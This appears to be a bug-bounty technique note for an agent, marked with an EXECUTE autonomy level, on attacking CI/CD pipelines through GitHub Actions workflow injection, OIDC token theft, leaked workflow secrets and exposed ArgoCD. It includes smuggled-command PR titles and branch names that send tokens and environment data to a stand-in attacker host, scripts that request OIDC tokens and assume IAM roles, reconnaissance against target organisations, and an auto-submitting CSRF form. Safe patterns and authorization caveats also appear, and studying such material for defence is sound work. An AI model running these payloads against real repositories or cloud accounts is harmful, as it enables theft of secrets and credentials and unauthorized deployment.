---
title: CI/CD Attack Vectors
created: 2026-03-10
tags: [skills-learned, cyber, cicd, supply-chain]
type: technique
payout_ceiling: $50K (double-bounty programs, RCE-in-build-chain)
auth_required: NO (zero-auth for public GitHub orgs; escalates with org membership)
autonomy_level: EXECUTE
---

# CI/CD Attack Vectors

## Arsenal Table

| Technique | Auth | Ceiling | Primary Tools |
|-----------|------|---------|---------------|
| workflow_injection — pull_request_target | Zero-auth | $30K | actionlint, Semgrep |
| OIDC token theft → cloud creds | Zero-auth | $50K | curl, sts:AssumeRole |
| Dependency confusion | Zero-auth | $30K | npm, pip, interactsh |
| Secrets in workflow logs | Zero-auth | $10K | TruffleHog, GitLeaks |
| ArgoCD unauthenticated API | Zero-auth | $20K | curl, nuclei |
| GitOps CSRF → deploy | Auth-creatable | $25K | Burp, csrf-poc |

---

## 1. GitHub Actions Workflow Injection

### The Critical Trigger: `pull_request_target`

`pull_request_target` runs in the **privileged context of the BASE REPO** even when triggered by a fork PR. This means:
- The workflow has access to repository secrets
- The `GITHUB_TOKEN` has write permissions on the base repo
- Code from the untrusted fork does NOT run — but **untrusted data from the PR does** if referenced in a `run:` block

**This is the most critical CI/CD misconfiguration class in 2026.**

### Untrusted Inputs (Attacker-Controlled)

```
github.event.pull_request.title          ← PR title (attacker sets freely)
github.event.pull_request.body           ← PR description (attacker sets freely)
github.event.pull_request.head.ref      ← branch name (attacker sets freely)
github.event.pull_request.head.sha      ← commit SHA (limited utility)
github.event.issue.title                 ← issue title
github.event.issue.body                  ← issue body
github.event.comment.body               ← PR/issue comment body
github.event.review.body                ← review comment body
github.event.discussion.title           ← discussion title
```

### Vulnerable Workflow Pattern

```yaml
# VULNERABLE — DO NOT USE
name: Label PRs
on:
  pull_request_target:
    types: [opened, edited]

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - name: Add label based on title
        run: |
          # INJECTION POINT: github.event.pull_request.title goes into shell
          TITLE="${{ github.event.pull_request.title }}"
          echo "Processing PR: $TITLE"
          gh label add "$TITLE" --repo $GITHUB_REPOSITORY
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Why it's vulnerable:** `${{ github.event.pull_request.title }}` is interpolated into the shell script BEFORE bash sees it. An attacker submits a PR with title:
```
"; curl https://ATTACKER.interactsh.com/$(cat /proc/1/environ | base64 -w0) #
```

The `run:` block becomes:
```bash
TITLE=""; curl https://ATTACKER.interactsh.com/$(cat /proc/1/environ | base64 -w0) #"
```

This exfiltrates the entire process environment, which includes `GITHUB_TOKEN` and any secrets mounted into the runner.

### Safe Pattern

```yaml
# SAFE — environment variable intermediary breaks injection
steps:
  - name: Add label based on title
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}  # assigned to env var, not interpolated
    run: |
      echo "Processing PR: $PR_TITLE"   # shell reads env var, no injection possible
      gh label add "$PR_TITLE" --repo "$GITHUB_REPOSITORY"
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Rule:** Never use `${{ github.event.* }}` directly in `run:` blocks. Always assign to an environment variable first.

### Exploit Payloads (Testing Only — Authorized Programs)

```bash
# Exfil GITHUB_TOKEN
"; env | grep -i token | base64 -w0 | curl -d @- https://INTERACTSH/leak #

# Exfil all secrets via environment
"; printenv | base64 -w0 | curl -X POST -d @- https://INTERACTSH/env #

# Read workflow file to find what secrets are mounted
"; cat .github/workflows/*.yml | base64 -w0 | curl -d @- https://INTERACTSH/wf #

# Branch name injection (github.head_ref)
# Create branch named: feature/test";curl${IFS}https://INTERACTSH/$(id|base64)
```

### Hunting Workflow

```bash
# Step 1: Find all repos in a GitHub org using pull_request_target
gh search code "pull_request_target" --owner TARGET_ORG --extension yml \
  --json repository,path --limit 100

# Step 2: For each workflow file, check for untrusted input interpolation
# Pattern: ${{ github.event.pull_request.* }} inside run: blocks
gh api repos/TARGET_ORG/TARGET_REPO/contents/.github/workflows \
  --jq '.[].name' | while read wf; do
  gh api "repos/TARGET_ORG/TARGET_REPO/contents/.github/workflows/$wf" \
    --jq '.content' | base64 -d
done

# Step 3: Static analysis with actionlint
# Install: go install github.com/rhysd/actionlint/cmd/actionlint@latest
actionlint .github/workflows/*.yml

# Step 4: Semgrep with GitHub Actions ruleset
semgrep --config "p/github-actions" .github/workflows/
```

### OIDC Token Theft via `id-token: write`

GitHub Actions supports OIDC federation — workflows can request short-lived tokens that cloud providers accept directly (no stored cloud credentials needed).

**Vulnerable configuration:**
```yaml
permissions:
  id-token: write    # workflow can request OIDC token
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789:role/GitHubActionsRole
      aws-region: us-east-1
```

If the AWS trust policy is misconfigured to allow any branch/repo (not pinned to `refs/heads/main`), a fork PR triggering `pull_request_target` can request the OIDC token and assume the IAM role.

**Misconfigured AWS trust policy (vulnerable):**
```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:ORG/REPO:*"
    }
  }
}
```

The wildcard `:*` means any branch, any workflow = fork PR can steal the role.

**Safe policy pins to specific branch:**
```json
"token.actions.githubusercontent.com:sub": "repo:ORG/REPO:ref:refs/heads/main"
```

**Testing OIDC theft:**
```bash
# In a malicious workflow (authorized testing only):
- name: Attempt OIDC token request
  id: oidc
  run: |
    token=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
    echo "Token: ${token:0:50}..."  # log first 50 chars as evidence

- name: Attempt role assumption
  run: |
    aws sts assume-role-with-web-identity \
      --role-arn arn:aws:iam::ACCOUNT:role/TARGET_ROLE \
      --role-session-name pwned \
      --web-identity-token "${{ steps.oidc.outputs.token }}"
```

---

## 2. Secrets in Workflow Logs

### Search Patterns

```bash
# GitHub code search for workflows with debug mode or set -x
org:TARGET path:.github/workflows set -x
org:TARGET path:.github/workflows ACTIONS_RUNNER_DEBUG
org:TARGET path:.github/workflows echo ${{ secrets.

# Search public workflow run logs (requires access to repo)
gh run list --repo TARGET_ORG/TARGET_REPO --limit 50 --json databaseId,name,status
gh run view RUN_ID --log --repo TARGET_ORG/TARGET_REPO | grep -iE "token|key|secret|password|api_"
```

### TruffleHog + GitLeaks for Secrets in History

```bash
# TruffleHog: scan git history for high-entropy secrets
trufflehog git https://github.com/TARGET_ORG/TARGET_REPO --only-verified

# GitLeaks: scan for secrets in current tree + history
gitleaks detect --source /path/to/repo --report-format json --report-path leaks.json

# GitLeaks against remote (no clone needed)
gitleaks detect --source . --no-git -r leaks.json

# Search for accidentally committed .env files
gh api graphql -f query='{
  search(query: "org:TARGET filename:.env", type: CODE, first: 100) {
    nodes { ... on Blob { text repository { nameWithOwner } } }
  }
}'
```

---

## 3. ArgoCD / GitOps Exposure

### Discovery

```bash
# Common ArgoCD subdomains
subfinder -d TARGET.com | grep -iE "argo|deploy|gitops|cd\."
# Check: argocd.TARGET.com, deploy.TARGET.com, gitops.TARGET.com, cd.TARGET.com

# Test unauthenticated API
curl -sk https://argocd.TARGET.com/api/v1/applications | jq '.items[].metadata.name'

# Nuclei template for ArgoCD exposure
nuclei -u https://argocd.TARGET.com -t nuclei-templates/exposed-panels/argocd.yaml
```

### Unauthenticated Application List

```bash
# If API responds without auth token, unauthenticated access confirmed
curl -sk https://argocd.TARGET.com/api/v1/applications \
  -H "Content-Type: application/json" | python3 -m json.tool

# Get application details including repo URLs and deployed configs
curl -sk https://argocd.TARGET.com/api/v1/applications/APP_NAME
```

### CSRF → Application Sync Attack

```html
<!-- Trigger sync of ArgoCD app to attacker-controlled commit -->
<form action="https://argocd.TARGET.com/api/v1/applications/production/sync" method="POST">
  <input type="hidden" name="revision" value="ATTACKER_COMMIT_SHA">
  <input type="submit" value="Submit">
</form>
<script>document.forms[0].submit();</script>
```

---

## Evidence Requirements

**Workflow injection:**
1. URL of the vulnerable workflow file (github.com/ORG/REPO/blob/main/.github/workflows/NAME.yml)
2. Screenshot of Interactsh callback showing `GITHUB_TOKEN=ghs_...` in the exfiltrated data
3. Proof that the token has permissions (GET /user with the token)

**OIDC theft:**
1. Vulnerable trust policy JSON (from AWS console or terraform)
2. STS response showing successful role assumption with temporary credentials

**ArgoCD:**
1. `curl` output showing unauthenticated API response with app names
2. Screenshot of ArgoCD UI accessible without login

---

## Reference

- nikitastupin/pwnhub: automated `pull_request_target` injection scanner
- actionlint: https://github.com/rhysd/actionlint
- Semgrep GitHub Actions ruleset: `semgrep --config p/github-actions`
- GitHub OIDC docs: https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments
- OWASP CICD-SEC-1 through CICD-SEC-10
